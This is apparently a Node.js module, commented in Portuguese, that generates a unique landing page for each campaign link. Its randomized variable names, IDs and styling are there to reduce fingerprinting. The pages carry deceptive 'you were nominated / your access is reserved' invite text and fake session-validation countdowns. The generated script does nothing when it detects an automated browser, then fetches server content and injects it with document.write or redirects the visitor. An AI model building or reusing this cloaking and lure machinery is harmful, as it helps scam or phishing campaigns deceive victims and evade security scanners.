/**
 * Variações polimórficas por link — HTML/CSS/JS únicos por seed (estável por link).
 * Objetivo: reduzir fingerprint entre campanhas sem mudar o comportamento da ponte.
 */

const LOADING_TEXTS = {
  idle: [
    'Carregando conteúdo…',
    'Preparando a página…',
    'Aguarde, carregando…',
    'Sincronizando conteúdo…',
    'Organizando informações…',
    'Um momento, por favor…'
  ],
  tick: [
    'Carregando conteúdo… {s}s',
    'Preparando página… {s}s',
    'Aguarde… {s}s',
    'Carregando… {s}s'
  ],
  done: [
    'Abrindo conteúdo…',
    'Quase pronto…',
    'Finalizando…',
    'Entrando…'
  ],
  fallback: [
    'Carregando conteúdo…',
    'Aguarde um instante…',
    'Processando…'
  ]
};

const INVITE_CHIPS = [
  'Indicação verificada',
  'Acesso reservado',
  'Lista confirmada',
  'Perfil validado'
];

const INVITE_HEADLINES = [
  'Seu nome consta nesta lista de acesso',
  'Você está na lista desta ação',
  'Seu acesso foi registrado nesta etapa',
  'Consta indicação em seu nome nesta ação'
];

const INVITE_BODY = [
  'indicou você para conferir o material reservado. O acesso é opcional e você pode sair quando quiser.',
  'liberou um acesso para você revisar o conteúdo. A participação é voluntária.',
  'reservou um acesso para você nesta ação. Você pode encerrar a qualquer momento.',
  'incluiu você na lista desta etapa. O conteúdo abre em instantes, se desejar continuar.'
];

const INVITE_VALIDATING = [
  'Estamos validando sua sessão antes de abrir o conteúdo completo.',
  'Validando seu acesso antes de exibir o material.',
  'Confirmando sua sessão para abrir o conteúdo.',
  'Preparando o ambiente antes de liberar o acesso.'
];

const INVITE_STATIC = [
  'Validando acesso. Aguarde a confirmação.',
  'Aguardando validação do acesso.',
  'Sessão em verificação. Aguarde.',
  'Acesso reservado. Aguarde confirmação.'
];

const INVITE_TICK = [
  'Liberando conteúdo em <strong>{s}s</strong>…',
  'Abrindo em <strong>{s}s</strong>…',
  'Preparando em <strong>{s}s</strong>…',
  'Validando em <strong>{s}s</strong>…'
];

const INVITE_DONE = [
  'Entrando agora…',
  'Abrindo agora…',
  'Liberando agora…',
  'Quase lá…'
];

const FONT_STACKS = [
  'system-ui,-apple-system,sans-serif',
  'Inter,system-ui,-apple-system,sans-serif',
  'Segoe UI,system-ui,sans-serif',
  'Roboto,Helvetica Neue,Arial,sans-serif',
  'ui-sans-serif,system-ui,-apple-system,sans-serif'
];

const BG_TONES = ['#f3f4f6', '#f4f6f8', '#eef1f5', '#f6f7f9', '#eceff3'];

function hashSeed(str) {
  let h = 2166136261;
  const s = String(str || 'default');
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
}

function createRng(seedStr) {
  let s = hashSeed(seedStr);
  return () => {
    s = (s + 0x6D2B79F5) >>> 0;
    let t = s;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function pick(rng, arr) {
  if (!arr || !arr.length) return '';
  return arr[Math.floor(rng() * arr.length)];
}

function genToken(rng, lenMin, lenMax) {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  const len = lenMin + Math.floor(rng() * (lenMax - lenMin + 1));
  let out = chars[Math.floor(rng() * chars.length)];
  for (let i = 1; i < len; i++) out += chars[Math.floor(rng() * chars.length)];
  return out;
}

function genVarNames(rng, count) {
  const names = new Set();
  while (names.size < count) {
    let n = genToken(rng, 2, 5);
    if (/^\d/.test(n)) n = 'v' + n;
    names.add(n);
  }
  return [...names];
}

function genAccent(rng) {
  const hues = [215, 225, 235, 245, 255, 265, 220, 230];
  const h = pick(rng, hues);
  const s = 55 + Math.floor(rng() * 25);
  const l = 42 + Math.floor(rng() * 12);
  const l2 = l + 18;
  return { main: `hsl(${h},${s}%,${l}%)`, light: `hsl(${h},${s}%,${l2}%)` };
}

function generateBridgeFingerprint() {
  const t = Date.now().toString(36);
  const r = Math.random().toString(36).slice(2, 9);
  return `${t}${r}`;
}

function resolveBridgeVariant(seed) {
  const rng = createRng(seed || generateBridgeFingerprint());
  const p = genToken(rng, 2, 4);
  const vars = genVarNames(rng, 14);
  const accent = genAccent(rng);
  const barPos = rng() > 0.35 ? 'top' : 'bottom';
  const maxW = 680 + Math.floor(rng() * 80);
  const radius = 10 + Math.floor(rng() * 10);
  const staticPct = 32 + Math.floor(rng() * 18);

  const loadingTick = pick(rng, LOADING_TEXTS.tick);
  const inviteTick = pick(rng, INVITE_TICK);

  return {
    seed: String(seed || ''),
    prefix: p,
    ids: {
      bar: `${p}b${Math.floor(rng() * 90 + 10)}`,
      status: `${p}s${Math.floor(rng() * 90 + 10)}`,
      cta: `${p}c${Math.floor(rng() * 90 + 10)}`
    },
    jsVars: vars,
    font: pick(rng, FONT_STACKS),
    bg: pick(rng, BG_TONES),
    accent,
    barPos,
    maxW,
    radius,
    staticPct,
    animName: `${p}sh${Math.floor(rng() * 900 + 100)}`,
    loading: {
      idle: pick(rng, LOADING_TEXTS.idle),
      tick: loadingTick,
      done: pick(rng, LOADING_TEXTS.done),
      fallback: pick(rng, LOADING_TEXTS.fallback)
    },
    invite: {
      chip: pick(rng, INVITE_CHIPS),
      headline: pick(rng, INVITE_HEADLINES),
      body: pick(rng, INVITE_BODY),
      validating: pick(rng, INVITE_VALIDATING),
      static: pick(rng, INVITE_STATIC),
      tick: inviteTick,
      done: pick(rng, INVITE_DONE),
      tagline: pick(rng, ['Indicação personalizada', 'Acesso personalizado', 'Lista reservada', 'Perfil selecionado']),
      ctaWait: pick(rng, ['Aguarde um instante…', 'Preparando…', 'Validando…', 'Um momento…']),
      ctaIdle: pick(rng, ['Acesso reservado', 'Aguardando validação', 'Sessão reservada', 'Perfil registrado']),
      skip: pick(rng, ['Prefiro sair', 'Não, obrigado', 'Encerrar', 'Sair agora'])
    }
  };
}

function fillTemplate(tpl, sec) {
  return tpl.replace(/\{s\}/g, String(sec));
}

/**
 * Script de timer polimórfico — nomes de variáveis/funções únicos por link.
 */
function buildBridgeTimerScript(opts = {}) {
  const {
    navPath,
    timerSec,
    barId,
    labelId,
    ctaId,
    jsVars,
    withTimer,
    messages = {}
  } = opts;
  if (!withTimer || !navPath) return '';

  const v = jsVars || genVarNames(() => Math.random(), 14);
  const [
    total, nav, t0, bar, lab, cta, lock, n, applyFn, pullFn, tickFn,
    msgTick, msgDone, msgFallback
  ] = v;

  const tickTpl = messages.tick || 'Carregando… {s}s';
  const doneMsg = messages.done || 'Abrindo…';
  const fallbackMsg = messages.fallback || 'Aguarde…';
  const ctaWait = messages.ctaWait || 'Aguarde…';
  const ctaDone = messages.ctaDone || 'Abrindo…';
  const tickHtml = tickTpl.includes('<');
  const doneHtml = String(doneMsg).includes('<');

  return `<script>(function(){try{if(navigator.webdriver)return;var ${total}=${timerSec}*1000,${nav}=${JSON.stringify(navPath)},${t0}=Date.now(),${bar}=document.getElementById(${JSON.stringify(barId)}),${lab}=document.getElementById(${JSON.stringify(labelId)}),${cta}=${ctaId ? `document.getElementById(${JSON.stringify(ctaId)})` : 'null'},${lock}=false,${n}=0;function ${applyFn}(d){if(!d||${lock})return;if(d.inline&&d.html){${lock}=true;try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next){${lock}=true;try{location.replace(d.next)}catch(e2){location.href=d.next}}}function ${pullFn}(){${n}++;var q=location.search||'';fetch(${nav}+q,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.ok?r.json():null}).then(function(d){if(d)${applyFn}(d);else if(${n}<3)setTimeout(${pullFn},320+Math.floor(Math.random()*120));else if(${lab})${lab}.textContent=${JSON.stringify(fallbackMsg)}}).catch(function(){if(${n}<3)setTimeout(${pullFn},320+Math.floor(Math.random()*120))})}function ${tickFn}(){var rem=Math.max(0,${total}-(Date.now()-${t0})),sec=Math.ceil(rem/1000),pct=Math.min(100,((${total}-rem)/${total})*100);if(${bar})${bar}.style.width=pct+'%';if(${lab}){var _m=sec>0?${JSON.stringify(tickTpl)}.replace('{s}',String(sec)):${JSON.stringify(doneMsg)};${tickHtml ? `if(sec>0){${lab}.innerHTML=_m}else{${doneHtml ? `${lab}.innerHTML=_m` : `${lab}.textContent=_m`}}` : `${lab}.textContent=_m`}}if(${cta})${cta}.textContent=sec>0?${JSON.stringify(ctaWait)}:${JSON.stringify(ctaDone)};if(rem<=0){${pullFn}();return}requestAnimationFrame(${tickFn})}requestAnimationFrame(${tickFn})}catch(e){}})();</script>`;
}

module.exports = {
  generateBridgeFingerprint,
  resolveBridgeVariant,
  buildBridgeTimerScript,
  fillTemplate
};
